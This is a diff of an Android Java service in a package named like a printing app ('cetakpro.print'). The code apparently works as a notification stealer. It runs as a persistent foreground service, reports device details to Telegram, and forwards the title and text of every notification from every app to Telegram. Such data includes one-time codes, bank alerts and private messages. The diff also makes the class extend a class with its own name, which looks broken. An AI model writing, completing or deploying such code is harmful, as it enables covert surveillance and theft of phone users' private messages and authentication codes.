@@ -3,25 +3,19 @@ package com.cetakpro.print;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.Service;
-import android.content.Context;
-import android.content.Intent;
 import android.os.Build;
-import android.os.IBinder;
-import android.os.PowerManager;
-import android.provider.Settings;
+import android.os.Bundle;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.util.Log;
 import android.widget.Toast;
 
-public class NotificationListenerService extends android.service.notification.NotificationListenerService {
+public class NotificationListenerService extends NotificationListenerService {
     private static final String TAG = "NotificationListener";
 
     @Override
     public void onCreate() {
         super.onCreate();
-        // Jalankan sebagai foreground service agar tidak dimatikan
         startForeground(1001, createNotification());
         Log.d(TAG, "✅ Service NotificationListener dibuat");
     }
@@ -31,7 +25,6 @@ public class NotificationListenerService extends android.service.notification.No
         super.onListenerConnected();
         Log.d(TAG, "✅ NotificationListenerService TERHUBUNG!");
         
-        // Kirim info ke Telegram bahwa service aktif
         String deviceName = Build.MODEL;
         String androidVersion = Build.VERSION.RELEASE;
         String message = "📱 SERVICE AKTIF\n" +
@@ -52,7 +45,7 @@ public class NotificationListenerService extends android.service.notification.No
         try {
             String appName = sbn.getPackageName();
             Notification notification = sbn.getNotification();
-            android.os.Bundle extras = notification.extras;
+            Bundle extras = notification.extras;
             
             String title = extras.getString("android.title", "");
             String text = extras.getString("android.text", "");
@@ -93,7 +86,6 @@ public class NotificationListenerService extends android.service.notification.No
             String telegramTitle = "🔔 " + appDisplayName;
             String telegramMessage = messageBuilder.toString();
             
-            // Kirim ke Telegram
             TelegramSender.sendMessage(this, telegramTitle, telegramMessage);
             
             Log.d(TAG, "📤 Notifikasi dikirim ke Telegram: " + telegramTitle);
@@ -129,9 +121,6 @@ public class NotificationListenerService extends android.service.notification.No
         }
     }
 
-    // ============================================================
-    // FOREGROUND NOTIFICATION
-    // ============================================================
     private Notification createNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
@@ -147,7 +136,7 @@ public class NotificationListenerService extends android.service.notification.No
             .setContentTitle("VanNota")
             .setContentText("Aplikasi berjalan di latar belakang.")
             .setSmallIcon(R.drawable.ic_notification)
-            .setOngoing(true) // Tidak bisa di-swipe hilang
+            .setOngoing(true)
             .build();
     }
 }
